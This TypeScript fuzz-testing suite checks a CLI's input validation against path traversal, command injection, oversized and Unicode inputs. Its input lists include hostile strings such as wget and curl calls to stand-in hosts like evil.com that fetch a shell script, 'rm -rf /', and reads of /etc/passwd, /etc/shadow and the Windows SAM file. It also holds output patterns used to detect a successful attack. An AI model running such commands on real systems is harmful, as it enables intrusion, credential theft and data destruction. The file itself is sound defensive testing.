/**
 * CLI Fuzz Testing Suite
 * 
 * Tests CLI argument parsing and input validation with randomized,
 * malicious, and edge-case inputs to detect crashes and vulnerabilities.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { exec, spawn } from 'child_process';
import { promisify } from 'util';
import { writeFile, mkdir, readFile } from 'fs/promises';
import { join, resolve } from 'path';
import crypto from 'crypto';

const execAsync = promisify(exec);

interface FuzzTestCase {
  name: string;
  command: string;
  inputs: string[];
  expectedBehavior: 'error' | 'success' | 'blocked';
  timeoutMs: number;
  category: string;
}

interface FuzzResult {
  testCase: FuzzTestCase;
  input: string;
  exitCode: number;
  stdout: string;
  stderr: string;
  duration: number;
  crashed: boolean;
  timeout: boolean;
  vulnerabilityDetected: boolean;
  errorType?: string;
}

interface FuzzReport {
  timestamp: string;
  totalTests: number;
  passed: number;
  failed: number;
  crashed: number;
  timeouts: number;
  vulnerabilities: number;
  categories: Record<string, number>;
  results: FuzzResult[];
  recommendations: string[];
}

describe('Phase 9: Fuzz Testing - CLI Input Validation', () => {
  const testOutputDir = resolve(process.cwd(), 'test-output/fuzz');
  const fuzzConfig = JSON.parse(
    await readFile(resolve(__dirname, '../config/fuzz-config.json'), 'utf-8')
      .catch(() => '{}')
  );
  
  const cliPath = resolve(process.cwd(), 'dist/index.js');
  const maxIterations = fuzzConfig.fuzzTesting?.maxIterations || 1000;
  const timeout = fuzzConfig.fuzzTesting?.timeout || 30000;

  beforeAll(async () => {
    await mkdir(testOutputDir, { recursive: true });
  });

  describe('Command Argument Fuzzing', () => {
    const fuzzTestCases: FuzzTestCase[] = [
      {
        name: 'project name fuzzing',
        command: 'new',
        inputs: generateProjectNameFuzzInputs(),
        expectedBehavior: 'blocked',
        timeoutMs: 10000,
        category: 'argumentFuzzing',
      },
      {
        name: 'template path fuzzing',
        command: 'new',
        inputs: generateTemplatePathFuzzInputs(),
        expectedBehavior: 'blocked',
        timeoutMs: 10000,
        category: 'pathTraversal',
      },
      {
        name: 'config file fuzzing',
        command: 'validate',
        inputs: generateConfigFileFuzzInputs(),
        expectedBehavior: 'blocked',
        timeoutMs: 10000,
        category: 'fileAccess',
      },
      {
        name: 'flag value fuzzing',
        command: 'generate',
        inputs: generateFlagValueFuzzInputs(),
        expectedBehavior: 'blocked',
        timeoutMs: 10000,
        category: 'flagFuzzing',
      },
    ];

    fuzzTestCases.forEach((testCase) => {
      it(`should handle ${testCase.name} securely`, async () => {
        const results: FuzzResult[] = [];
        const maxTests = Math.min(testCase.inputs.length, 100); // Limit for test performance
        
        for (let i = 0; i < maxTests; i++) {
          const input = testCase.inputs[i];
          const result = await runFuzzTest(testCase, input);
          results.push(result);
          
          // Check for immediate failures
          if (result.crashed || result.vulnerabilityDetected) {
            const crashReport = {
              timestamp: new Date().toISOString(),
              testCase: testCase.name,
              input,
              result,
            };
            
            const crashPath = join(testOutputDir, `crash-${testCase.category}-${i}.json`);
            await writeFile(crashPath, JSON.stringify(crashReport, null, 2));
          }
        }
        
        // Generate test case report
        const report = generateFuzzTestReport(testCase, results);
        const reportPath = join(testOutputDir, `${testCase.category}-report.json`);
        await writeFile(reportPath, JSON.stringify(report, null, 2));
        
        // Assert security expectations
        const crashedTests = results.filter(r => r.crashed);
        const vulnerabilities = results.filter(r => r.vulnerabilityDetected);
        
        expect(crashedTests.length).toBe(0);
        expect(vulnerabilities.length).toBe(0);
        
        // Most inputs should be properly rejected
        const properlyHandled = results.filter(r => 
          r.exitCode !== 0 && !r.crashed && !r.timeout
        );
        expect(properlyHandled.length / results.length).toBeGreaterThan(0.8);
      }, 120000); // 2 minutes timeout per test case
    });
  });

  describe('Path Traversal Protection', () => {
    const pathTraversalInputs = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '/dev/null/../../../etc/shadow',
      'C:\\..\\..\\Windows\\System32\\config\\SAM',
      '....//....//....//etc//passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '\\\\?\\C:\\Windows\\System32\\config\\SYSTEM',
      '/proc/self/environ',
      '/proc/self/mem',
      'file:///etc/passwd',
    ];

    it('should block path traversal attempts in file operations', async () => {
      const results: FuzzResult[] = [];
      
      for (const maliciousPath of pathTraversalInputs) {
        // Test various commands that accept file paths
        const commands = [
          `validate --config "${maliciousPath}"`,
          `new myproject --template "${maliciousPath}"`,
          `generate component --output "${maliciousPath}"`,
        ];
        
        for (const cmd of commands) {
          const result = await runCliCommand(cmd, 15000);
          results.push({
            testCase: { 
              name: 'path traversal protection', 
              command: cmd, 
              inputs: [maliciousPath],
              expectedBehavior: 'blocked',
              timeoutMs: 15000,
              category: 'pathTraversal'
            },
            input: maliciousPath,
            ...result,
            vulnerabilityDetected: isPathTraversalVulnerable(result),
          });
        }
      }
      
      const report = {
        timestamp: new Date().toISOString(),
        category: 'pathTraversal',
        totalTests: results.length,
        results: results.map(r => ({
          command: r.testCase.command,
          input: r.input,
          blocked: r.exitCode !== 0 && !r.vulnerabilityDetected,
          vulnerable: r.vulnerabilityDetected,
        })),
      };
      
      const reportPath = join(testOutputDir, 'path-traversal-report.json');
      await writeFile(reportPath, JSON.stringify(report, null, 2));
      
      // Assert no path traversal vulnerabilities
      const vulnerableResults = results.filter(r => r.vulnerabilityDetected);
      expect(vulnerableResults.length).toBe(0);
    });
  });

  describe('Command Injection Protection', () => {
    const commandInjectionInputs = [
      '; ls -la',
      '& dir',
      '| cat /etc/passwd',
      '`id`',
      '$(whoami)',
      '${IFS}cat${IFS}/etc/passwd',
      ';wget http://evil.com/shell.sh',
      '&& curl evil.com',
      '||ping -c 10 127.0.0.1',
      ';rm -rf /',
      '`rm -rf /tmp/*`',
      '$(rm -rf /tmp/*)',
    ];

    it('should prevent command injection in all inputs', async () => {
      const results: FuzzResult[] = [];
      
      for (const maliciousInput of commandInjectionInputs) {
        // Test various CLI inputs that could be vulnerable to injection
        const testCases = [
          `new "${maliciousInput}"`,
          `generate component "${maliciousInput}"`,
          `validate --project "${maliciousInput}"`,
        ];
        
        for (const testCase of testCases) {
          const result = await runCliCommand(testCase, 20000);
          results.push({
            testCase: {
              name: 'command injection protection',
              command: testCase,
              inputs: [maliciousInput],
              expectedBehavior: 'blocked',
              timeoutMs: 20000,
              category: 'commandInjection'
            },
            input: maliciousInput,
            ...result,
            vulnerabilityDetected: isCommandInjectionVulnerable(result),
          });
        }
      }
      
      const report = {
        timestamp: new Date().toISOString(),
        category: 'commandInjection',
        totalTests: results.length,
        vulnerabilities: results.filter(r => r.vulnerabilityDetected).length,
        results: results.map(r => ({
          command: r.testCase.command,
          input: r.input,
          safe: !r.vulnerabilityDetected,
          exitCode: r.exitCode,
          duration: r.duration,
        })),
      };
      
      const reportPath = join(testOutputDir, 'command-injection-report.json');
      await writeFile(reportPath, JSON.stringify(report, null, 2));
      
      // Assert no command injection vulnerabilities
      const vulnerableResults = results.filter(r => r.vulnerabilityDetected);
      expect(vulnerableResults.length).toBe(0);
    });
  });

  describe('Buffer Overflow Testing', () => {
    const bufferOverflowInputs = [
      'A'.repeat(1000),
      'A'.repeat(10000),
      'A'.repeat(100000),
      '\x00'.repeat(1000),
      '\xff'.repeat(1000),
      '🚀'.repeat(1000),
      '𝕏'.repeat(500),
      'A'.repeat(65536),
      JSON.stringify({ data: 'A'.repeat(100000) }),
    ];

    it('should handle large inputs without crashing', async () => {
      const results: FuzzResult[] = [];
      
      for (const largeInput of bufferOverflowInputs) {
        const testCase = `new "${largeInput}"`;
        const result = await runCliCommand(testCase, 30000);
        
        results.push({
          testCase: {
            name: 'buffer overflow protection',
            command: testCase,
            inputs: [largeInput],
            expectedBehavior: 'error',
            timeoutMs: 30000,
            category: 'bufferOverflow'
          },
          input: `${largeInput.substring(0, 50)}... (${largeInput.length} chars)`,
          ...result,
          vulnerabilityDetected: result.crashed || result.timeout,
        });
      }
      
      const report = {
        timestamp: new Date().toISOString(),
        category: 'bufferOverflow',
        totalTests: results.length,
        crashed: results.filter(r => r.crashed).length,
        timeouts: results.filter(r => r.timeout).length,
        results: results.map(r => ({
          inputLength: r.testCase.inputs[0].length,
          crashed: r.crashed,
          timeout: r.timeout,
          duration: r.duration,
          memoryUsage: getMemoryUsageFromOutput(r.stderr),
        })),
      };
      
      const reportPath = join(testOutputDir, 'buffer-overflow-report.json');
      await writeFile(reportPath, JSON.stringify(report, null, 2));
      
      // Assert no crashes from large inputs
      const crashedResults = results.filter(r => r.crashed);
      expect(crashedResults.length).toBe(0);
      
      // Timeouts are acceptable for very large inputs, but not too many
      const timeoutResults = results.filter(r => r.timeout);
      expect(timeoutResults.length / results.length).toBeLessThan(0.3);
    });
  });

  describe('Unicode and Encoding Tests', () => {
    const unicodeInputs = [
      '\u0000\u0001\u0002\u0003',
      '\u200B\u200C\u200D',
      '\u202A\u202B\u202C\u202D\u202E',
      '\uFEFF',
      '𝒸𝓁𝒾',
      'тест',
      '测试',
      '🔥💥⚡',
      '\u{1F600}\u{1F601}\u{1F602}',
      '\u{10000}\u{10001}\u{10002}',
    ];

    it('should handle Unicode inputs safely', async () => {
      const results: FuzzResult[] = [];
      
      for (const unicodeInput of unicodeInputs) {
        const testCase = `new "${unicodeInput}"`;
        const result = await runCliCommand(testCase, 15000);
        
        results.push({
          testCase: {
            name: 'unicode handling',
            command: testCase,
            inputs: [unicodeInput],
            expectedBehavior: 'error',
            timeoutMs: 15000,
            category: 'unicode'
          },
          input: unicodeInput,
          ...result,
          vulnerabilityDetected: result.crashed,
        });
      }
      
      const report = {
        timestamp: new Date().toISOString(),
        category: 'unicode',
        totalTests: results.length,
        results: results.map(r => ({
          input: r.input,
          handledSafely: !r.crashed && r.exitCode !== 0,
          crashed: r.crashed,
        })),
      };
      
      const reportPath = join(testOutputDir, 'unicode-report.json');
      await writeFile(reportPath, JSON.stringify(report, null, 2));
      
      // Assert no crashes from Unicode inputs
      const crashedResults = results.filter(r => r.crashed);
      expect(crashedResults.length).toBe(0);
    });
  });

  describe('Environment Variable Fuzzing', () => {
    const environmentVariables = [
      'PATH', 'NODE_ENV', 'HOME', 'TEMP', 'USER',
      'XAHEEN_CONFIG', 'XAHEEN_TEMPLATE_PATH'
    ];

    const maliciousEnvValues = [
      '$(whoami)',
      '`id`',
      '../../../etc/passwd',
      'javascript:alert(1)',
      '\u0000\u0001\u0002',
      'A'.repeat(100000),
    ];

    it('should handle malicious environment variables safely', async () => {
      const results: FuzzResult[] = [];
      
      for (const envVar of environmentVariables) {
        for (const maliciousValue of maliciousEnvValues) {
          const env = { ...process.env, [envVar]: maliciousValue };
          const result = await runCliCommandWithEnv('--help', env, 10000);
          
          results.push({
            testCase: {
              name: 'environment variable fuzzing',
              command: '--help',
              inputs: [`${envVar}=${maliciousValue}`],
              expectedBehavior: 'success',
              timeoutMs: 10000,
              category: 'environment'
            },
            input: `${envVar}=${maliciousValue}`,
            ...result,
            vulnerabilityDetected: result.crashed || isEnvironmentVulnerable(result, maliciousValue),
          });
        }
      }
      
      const report = {
        timestamp: new Date().toISOString(),
        category: 'environment',
        totalTests: results.length,
        vulnerabilities: results.filter(r => r.vulnerabilityDetected).length,
        results: results.map(r => ({
          envInput: r.input,
          safe: !r.vulnerabilityDetected,
          crashed: r.crashed,
        })),
      };
      
      const reportPath = join(testOutputDir, 'environment-fuzz-report.json');
      await writeFile(reportPath, JSON.stringify(report, null, 2));
      
      // Assert no environment variable vulnerabilities
      const vulnerableResults = results.filter(r => r.vulnerabilityDetected);
      expect(vulnerableResults.length).toBe(0);
    });
  });

  describe('Comprehensive Fuzz Report', () => {
    it('should generate comprehensive fuzz testing report', async () => {
      // Aggregate all fuzz test results
      const reportFiles = [
        'argumentFuzzing-report.json',
        'pathTraversal-report.json', 
        'command-injection-report.json',
        'buffer-overflow-report.json',
        'unicode-report.json',
        'environment-fuzz-report.json',
      ];
      
      const aggregatedData: any[] = [];
      let totalTests = 0;
      let totalVulnerabilities = 0;
      let totalCrashes = 0;
      
      for (const reportFile of reportFiles) {
        try {
          const reportPath = join(testOutputDir, reportFile);
          const reportContent = await readFile(reportPath, 'utf-8');
          const report = JSON.parse(reportContent);
          
          aggregatedData.push(report);
          totalTests += report.totalTests || report.results?.length || 0;
          totalVulnerabilities += report.vulnerabilities || 0;
          totalCrashes += report.crashed || 0;
        } catch (error) {
          console.warn(`Could not read report file ${reportFile}:`, error);
        }
      }
      
      const comprehensiveReport = {
        timestamp: new Date().toISOString(),
        summary: {
          totalTests,
          totalVulnerabilities,
          totalCrashes,
          securityScore: Math.max(0, 100 - (totalVulnerabilities * 10) - (totalCrashes * 20)),
          riskLevel: totalVulnerabilities === 0 && totalCrashes === 0 ? 'low' : 
                    totalVulnerabilities < 5 && totalCrashes === 0 ? 'medium' : 'high',
        },
        categories: aggregatedData.map(report => ({
          category: report.category,
          tests: report.totalTests || report.results?.length || 0,
          vulnerabilities: report.vulnerabilities || 0,
          crashes: report.crashed || 0,
        })),
        recommendations: generateFuzzRecommendations(totalVulnerabilities, totalCrashes),
        detailedReports: reportFiles,
      };
      
      const comprehensivePath = join(testOutputDir, 'comprehensive-fuzz-report.json');
      await writeFile(comprehensivePath, JSON.stringify(comprehensiveReport, null, 2));
      
      // Assert overall security posture
      expect(comprehensiveReport.summary.totalVulnerabilities).toBe(0);
      expect(comprehensiveReport.summary.totalCrashes).toBe(0);
      expect(comprehensiveReport.summary.securityScore).toBeGreaterThanOrEqual(95);
    });
  });
});

// Helper Functions

async function runFuzzTest(testCase: FuzzTestCase, input: string): Promise<FuzzResult> {
  const command = `${testCase.command} "${input}"`;
  const startTime = Date.now();
  
  try {
    const result = await runCliCommand(command, testCase.timeoutMs);
    const duration = Date.now() - startTime;
    
    return {
      testCase,
      input,
      duration,
      ...result,
      vulnerabilityDetected: detectVulnerability(result, input),
    };
  } catch (error) {
    return {
      testCase,
      input,
      duration: Date.now() - startTime,
      exitCode: -1,
      stdout: '',
      stderr: (error as any).message || '',
      crashed: true,
      timeout: false,
      vulnerabilityDetected: true,
    };
  }
}

async function runCliCommand(
  command: string, 
  timeoutMs: number = 30000
): Promise<{
  exitCode: number;
  stdout: string;
  stderr: string;
  crashed: boolean;
  timeout: boolean;
}> {
  return new Promise((resolve) => {
    const fullCommand = `node ${resolve(process.cwd(), 'dist/index.js')} ${command}`;
    const child = spawn('node', [resolve(process.cwd(), 'dist/index.js'), ...command.split(' ')], {
      timeout: timeoutMs,
      stdio: 'pipe',
    });

    let stdout = '';
    let stderr = '';
    let timeout = false;

    child.stdout?.on('data', (data) => {
      stdout += data.toString();
    });

    child.stderr?.on('data', (data) => {
      stderr += data.toString();
    });

    const timer = setTimeout(() => {
      timeout = true;
      child.kill('SIGKILL');
    }, timeoutMs);

    child.on('close', (code) => {
      clearTimeout(timer);
      resolve({
        exitCode: code || 0,
        stdout,
        stderr,
        crashed: code === null || code < 0,
        timeout,
      });
    });

    child.on('error', (error) => {
      clearTimeout(timer);
      resolve({
        exitCode: -1,
        stdout,
        stderr: stderr + error.message,
        crashed: true,
        timeout,
      });
    });
  });
}

async function runCliCommandWithEnv(
  command: string,
  env: NodeJS.ProcessEnv,
  timeoutMs: number = 30000
): Promise<{
  exitCode: number;
  stdout: string;
  stderr: string;
  crashed: boolean;
  timeout: boolean;
}> {
  return new Promise((resolve) => {
    const child = spawn('node', [resolve(process.cwd(), 'dist/index.js'), ...command.split(' ')], {
      timeout: timeoutMs,
      stdio: 'pipe',
      env,
    });

    let stdout = '';
    let stderr = '';
    let timeout = false;

    child.stdout?.on('data', (data) => {
      stdout += data.toString();
    });

    child.stderr?.on('data', (data) => {
      stderr += data.toString();
    });

    const timer = setTimeout(() => {
      timeout = true;
      child.kill('SIGKILL');
    }, timeoutMs);

    child.on('close', (code) => {
      clearTimeout(timer);
      resolve({
        exitCode: code || 0,
        stdout,
        stderr,
        crashed: code === null || code < 0,
        timeout,
      });
    });

    child.on('error', (error) => {
      clearTimeout(timer);
      resolve({
        exitCode: -1,
        stdout,
        stderr: stderr + error.message,
        crashed: true,
        timeout,
      });
    });
  });
}

function generateProjectNameFuzzInputs(): string[] {
  const inputs: string[] = [];
  
  // Path traversal attempts
  inputs.push(...[
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\SAM',
    '/dev/null',
    'CON', 'PRN', 'AUX', 'NUL', // Windows reserved names
  ]);
  
  // Command injection attempts
  inputs.push(...[
    '; ls -la',
    '`whoami`',
    '$(id)',
    '& dir',
    '| cat /etc/passwd',
  ]);
  
  // Buffer overflow attempts
  inputs.push(...[
    'A'.repeat(1000),
    'A'.repeat(10000),
    '\x00'.repeat(1000),
  ]);
  
  // Unicode and special characters
  inputs.push(...[
    '\u0000test',
    '\u202Etest',
    '🚀💥test',
    'тест',
    '测试',
  ]);
  
  // Random fuzzing
  for (let i = 0; i < 100; i++) {
    inputs.push(crypto.randomBytes(Math.floor(Math.random() * 100) + 1).toString('hex'));
  }
  
  return inputs;
}

function generateTemplatePathFuzzInputs(): string[] {
  return [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '/dev/null/../../../etc/shadow',
    '\\\\?\\C:\\Windows\\System32\\config\\SAM',
    'file:///etc/passwd',
    'http://evil.com/template',
    'ftp://malicious.com/template',
    '\u0000template',
    'template\u0000',
  ];
}

function generateConfigFileFuzzInputs(): string[] {
  return [
    '../../../etc/passwd',
    '/proc/self/environ',
    '/dev/urandom',
    'C:\\Windows\\System32\\config\\SYSTEM',
    '\\\\localhost\\c$\\windows\\system32\\drivers\\etc\\hosts',
    '\u0000config.json',
    'config.json\u0000',
  ];
}

function generateFlagValueFuzzInputs(): string[] {
  return [
    '; rm -rf /',
    '`curl evil.com`',
    '$(wget malicious.com/shell)',
    '../../../sensitive-file',
    '\u0000\u0001\u0002',
    'javascript:alert(1)',
    'A'.repeat(10000),
  ];
}

function detectVulnerability(result: any, input: string): boolean {
  // Check for various vulnerability indicators
  if (result.crashed) return true;
  if (result.timeout && input.length < 1000) return true; // Unexpected timeout
  
  // Check for command injection indicators
  if (result.stdout.includes('uid=') || result.stdout.includes('gid=')) return true;
  if (result.stdout.includes('/etc/passwd') || result.stdout.includes('system32')) return true;
  
  // Check for path traversal success
  if (result.stdout.includes('root:x:0:0')) return true;
  
  return false;
}

function isPathTraversalVulnerable(result: any): boolean {
  const indicators = [
    'root:x:0:0', // /etc/passwd content
    '[boot loader]', // Windows boot.ini
    'Windows Registry Editor', // Windows registry files
    'HKEY_LOCAL_MACHINE', // Registry keys
  ];
  
  const output = result.stdout + result.stderr;
  return indicators.some(indicator => output.includes(indicator));
}

function isCommandInjectionVulnerable(result: any): boolean {
  const indicators = [
    'uid=', 'gid=', // Unix id command output
    'total ', // ls -la output
    'Directory of', // Windows dir output  
    'PING ', // ping command output
    'HTTP/', // curl/wget output
  ];
  
  const output = result.stdout + result.stderr;
  return indicators.some(indicator => output.includes(indicator));
}

function isEnvironmentVulnerable(result: any, envValue: string): boolean {
  // Check if malicious environment value appears in output unexpectedly
  if (envValue.includes('$(') || envValue.includes('`')) {
    const output = result.stdout + result.stderr;
    // Should not execute commands or show command output
    return output.includes('uid=') || output.includes('gid=') || output.includes('total ');
  }
  return false;
}

function getMemoryUsageFromOutput(stderr: string): number | null {
  // Try to extract memory usage information from stderr
  const memoryMatch = stderr.match(/memory usage: (\d+)/i);
  return memoryMatch ? parseInt(memoryMatch[1]) : null;
}

function generateFuzzTestReport(testCase: FuzzTestCase, results: FuzzResult[]): any {
  return {
    timestamp: new Date().toISOString(),
    testCase: testCase.name,
    category: testCase.category,
    totalTests: results.length,
    passed: results.filter(r => !r.crashed && !r.vulnerabilityDetected).length,
    failed: results.filter(r => r.exitCode !== 0 && !r.crashed && !r.vulnerabilityDetected).length,
    crashed: results.filter(r => r.crashed).length,
    timeouts: results.filter(r => r.timeout).length,
    vulnerabilities: results.filter(r => r.vulnerabilityDetected).length,
    averageDuration: results.reduce((sum, r) => sum + r.duration, 0) / results.length,
    results: results.slice(0, 10), // Include first 10 results for analysis
  };
}

function generateFuzzRecommendations(vulnerabilities: number, crashes: number): string[] {
  const recommendations: string[] = [];
  
  if (vulnerabilities > 0) {
    recommendations.push('Critical: Vulnerabilities detected in CLI input handling. Review input validation and sanitization.');
  }
  
  if (crashes > 0) {
    recommendations.push('High: CLI crashes detected. Implement better error handling and input bounds checking.');
  }
  
  if (vulnerabilities === 0 && crashes === 0) {
    recommendations.push('Good: No critical security issues detected in fuzz testing.');
    recommendations.push('Continue regular fuzz testing to maintain security posture.');
  }
  
  recommendations.push('Implement continuous fuzz testing in CI/CD pipeline.');
  recommendations.push('Monitor for new vulnerability patterns and update fuzz test cases.');
  
  return recommendations;
}